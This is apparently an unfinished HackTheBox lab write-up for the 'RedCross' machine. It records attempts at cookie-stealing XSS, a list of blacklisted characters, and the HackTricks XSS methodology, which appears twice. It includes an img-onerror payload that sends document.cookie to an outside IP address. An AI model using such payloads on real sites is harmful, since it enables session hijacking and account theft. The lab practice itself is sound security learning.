# RedCross Writeup

Name: RedCross
Date:  28/4/2024
Difficulty:  Medium
Goals:  
- Steal some cookies, it has been a while
Learnt:
Beyond Root:
- Finish the new XSS room on https://tryhackme.com/r/room/axss

- [[RedCross-Notes.md]]
- [[RedCross-CMD-by-CMDs.md]]

I recently came across the need to be able to exploit an XSS cookie hijacking attack 
## Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/RedCross/Screenshots/ping.png)

I did look at this machine my notes at of review state:
I have tried:
- injections 
- sqlmap
- php filter and fuzzed for files
- SSRF
- different vhost/subdomain
Found: 
- intra.redcross.htb subdomain
TLS vulnerabilities are all that is left!
- https://www.exploit-db.com/exploits/32764 - server closed connections

XSS is one of my lesser done exploits as it requires boxes with automated users on the box and most courses that are not web exclusive tend to not have XSS as part of assessment unless specified. The only circumstance that XSS I know of where I does not require automated users is if there is a SQL injection that store page data that is programmed to be reflected after storing and retrieving it. This is analogous to SSTI without the framework, but would require a database and the source code, which actually implements pages like a profile page.  
![](ippsecvideoexplaination.png)

This is two hints from being a Helped-Through.
![](www-root.png)

## XSS 

As has already been stated, I looked up machine that had XSS to specifically have another box to learn to steal cookies, unfortunately the THM does cover this - got to through the Reflected XSS section and practical. 
![](initialattempt.png)
This XSS payload was found on https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies and here it is proxied through `burpsuite`.
![1080](initialattemptinburpsuite.png)

Firstly from other exploit types the best first step is to check for bad characters, I decided to just copy and paste a improved special characters and their (double) encoded variants. Also will test whether Reset as a subject type works:
![](specialcharacters.png)

Still no cookies in the jar:
![](stillnocookiesinthejar.png)

![](subjectmightactuallynotbechecked.png)


[HackTricks XSS Methodology](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
1. Check if **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) is being **reflected** in the HTML or **used** by **JS** code.ls -la
2. **Find the context** where it's reflected/used.
3. If **reflected**
    1. Check **which symbols can you use** and depending on that, prepare the payload:
        1. In **raw HTML**:
            1. Can you create new HTML tags?
            2. Can you use events or attributes supporting `javascript:` protocol?
            3. Can you bypass protections?
            4. Is the HTML content being interpreted by any client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), you could abuse a [**Client Side Template Injection**](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti).
            5. If you cannot create HTML tags that execute JS code, could you abuse a [**Dangling Markup - HTML scriptless injection**](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)?
        2. Inside a **HTML tag**:
            1. Can you exit to raw HTML context?
            2. Can you create new events/attributes to execute JS code?
            3. Does the attribute where you are trapped support JS execution?
            4. Can you bypass protections?
        3. Inside **JavaScript code**:
            1. Can you escape the `<script>` tag?
            2. Can you escape the string and execute different JS code?
            3. Are your input in template literals ``?
            4. Can you bypass protections?
        4. JavaScript **function** being **executed**
            1. You can indicate the name of the function to execute. e.g.: `?callback=alert(1)`
4. If **used**:    
    1. You could exploit a **DOM XSS**, pay attention how your input is controlled and if your **controlled input is used by any sink.**


```html
<script>fetch('http://10.10.14.29')</script>
<img src=x onerror="this.src='http://10.10.14.29/'+document.cookie; this.removeAttribute('onerror');">
```

![](oopspage.png)

#### Enumerating Bad Characters

![](documentDotcookieNotbacklist.png)

![](fetchFuncNotBlacklisted.png)

![](gtAndltblacklisted.png)

![](dotNotblacklisted.png)

![](eqNotBlacklisted.png)

![](semicolonNotBlacklisted.png)

![](wordScriptNotBlacklisted.png)

![](imgAndsrcNotBlacklisted.png)

![](httpAndhttpsAndcolonNotBlacklisted.png)

![](quotesAndcommasNotBlaacklisted.png)

![](backslashAndHexNotBlacklisted.png)

Not Blacklisted
```js
fetch()
document.cookie
/
.
=
;
script
img
src
https://
http://
'',
```

Blacklisted
```js
<
>
```

![](notEvenAScan.png)
So presumable I lost the data on this box or did not actually do. So I have at least put in some work even if it as looking now at the description more carefully I have a lot more to do. Therefore I will turn this into a Helped-Through and will try out the new Guided Mode on another machine today instead as I have yet to try that and question whether it is worth doing. [2390s of IppSec at some point not sure when](https://www.youtube.com/watch?v=-GNyDEQ9UDU&t=2390s)

## Foothold

## Privilege Escalation

## Post Root Reflection

## Beyond Root

[HackTricks XSS Methodology](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
1. Check if **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) is being **reflected** in the HTML or **used** by **JS** code.ls -la
2. **Find the context** where it's reflected/used.
3. If **reflected**
    1. Check **which symbols can you use** and depending on that, prepare the payload:
        1. In **raw HTML**:
            1. Can you create new HTML tags?
            2. Can you use events or attributes supporting `javascript:` protocol?
            3. Can you bypass protections?
            4. Is the HTML content being interpreted by any client side JS engine (_AngularJS_, _VueJS_, _Mavo_...), you could abuse a [**Client Side Template Injection**](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti).
            5. If you cannot create HTML tags that execute JS code, could you abuse a [**Dangling Markup - HTML scriptless injection**](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)?
        2. Inside a **HTML tag**:
            1. Can you exit to raw HTML context?
            2. Can you create new events/attributes to execute JS code?
            3. Does the attribute where you are trapped support JS execution?
            4. Can you bypass protections?
        3. Inside **JavaScript code**:
            1. Can you escape the `<script>` tag?
            2. Can you escape the string and execute different JS code?
            3. Are your input in template literals ``?
            4. Can you bypass protections?
        4. JavaScript **function** being **executed**
            1. You can indicate the name of the function to execute. e.g.: `?callback=alert(1)`
4. If **used**:    
    1. You could exploit a **DOM XSS**, pay attention how your input is controlled and if your **controlled input is used by any sink.**